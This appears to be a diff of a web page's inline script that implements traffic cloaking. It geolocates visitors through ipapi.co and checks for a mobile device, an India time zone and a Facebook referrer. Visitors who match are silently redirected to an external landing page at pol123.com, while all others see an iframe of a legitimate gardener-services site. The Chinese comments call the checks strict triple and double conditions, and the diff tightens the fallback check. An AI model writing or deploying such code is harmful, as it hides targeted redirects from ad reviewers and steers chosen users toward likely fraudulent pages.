@@ -32,56 +32,50 @@
   <body onload="handleResponse()">
  
 <script>
-  function handleResponse() {
-    function isMobileDevice() {
-      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-    }
+ function handleResponse() {
+  function isMobileDevice() {
+    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+  }
 
-   function isEnglishLang() {
-    return navigator.language.startsWith('en') || 
-           navigator.languages.some(lang => lang.startsWith('en'));
-} 
-function isTrafficFromFacebook() { 
-  const referrer = document.referrer.toLowerCase();
-  if (referrer.includes('facebook.com') || referrer.includes('fb.com')) {
-    return true;
+  function isTrafficFromFacebook() { 
+    const referrer = document.referrer.toLowerCase();
+    return referrer.includes('facebook.com') || referrer.includes('fb.com');
   }
-	
-function isIndianTimeZone() {
-  const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-  return timeZone === 'Asia/Kolkata'; // 印度时区唯一标识
-}
-    fetch('https://ipapi.co/json/')
-      .then(response => response.json())
-      .then(data => {
-        // 严格的三重条件判断
-        if (data.country === 'IN' && isMobileDevice() && isIndianTimeZone() && isTrafficFromFacebook()) {
-          window.location.href = "http://luodiye.pol123.com/";
-          return;
-        }
+
+  function isIndianTimeZone() {
+    const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    return timeZone === 'Asia/Kolkata'; 
+  }
+
+  fetch('https://ipapi.co/json/')
+    .then(response => response.json())
+    .then(data => {
+      // 严格的三重条件判断
+      if (data.country === 'IN' && isMobileDevice() && isIndianTimeZone() && isTrafficFromFacebook()) {
+        window.location.href = "http://luodiye.pol123.com/";
+        return;
+      }
      
-        
-        var iframe = document.createElement('iframe');
-        iframe.src = 'https://housekeep.com/tradespeople/gardener/regions-all/';
-        iframe.style.width = '100%';
-        iframe.style.height = '100vh';
-        document.body.appendChild(iframe);
-      })
-      .catch(() => {
-        // IP检测失败时严格的双重条件判断
-        if (isMobileDevice() && isEnglishLang()) {
-          window.location.href = "http://luodiye.pol123.com/";
-          return;
-        }
-        
-        
-        var iframe = document.createElement('iframe');
-        iframe.src = 'https://housekeep.com/tradespeople/gardener/regions-all/';
-        iframe.style.width = '100%';
-        iframe.style.height = '100vh';
-        document.body.appendChild(iframe);
-      });
-  }
+      var iframe = document.createElement('iframe');
+      iframe.src = 'https://housekeep.com/tradespeople/gardener/regions-all/';
+      iframe.style.width = '100%';
+      iframe.style.height = '100vh';
+      document.body.appendChild(iframe);
+    })
+    .catch(() => {
+      // IP检测失败时严格的双重条件判断
+      if (isMobileDevice() && isIndianTimeZone()) {
+        window.location.href = "http://luodiye.pol123.com/";
+        return;
+      }
+
+      var iframe = document.createElement('iframe');
+      iframe.src = 'https://housekeep.com/tradespeople/gardener/regions-all/';
+      iframe.style.width = '100%';
+      iframe.style.height = '100vh';
+      document.body.appendChild(iframe);
+    });
+}
 </script>
  
 <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
